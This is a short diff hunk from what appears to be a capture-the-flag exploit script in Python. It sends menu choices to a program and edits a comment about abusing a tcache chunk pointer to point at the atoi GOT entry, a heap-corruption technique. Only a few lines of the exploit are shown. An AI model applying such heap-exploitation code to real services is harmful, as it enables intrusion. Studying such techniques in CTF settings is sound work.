@@ -26,7 +26,7 @@ print t.read_until(">")
 t.write("2\n")
 t.write("A"*6+"\n")
 print t.read_until(">")
-#pop and abuse next free chunk pointer to point to atoi@got
+#pop and abuse tchache chunk pointer to point to atoi@got
 t.write("4\n")
 print t.read_until(">")
 t.write("4\n")
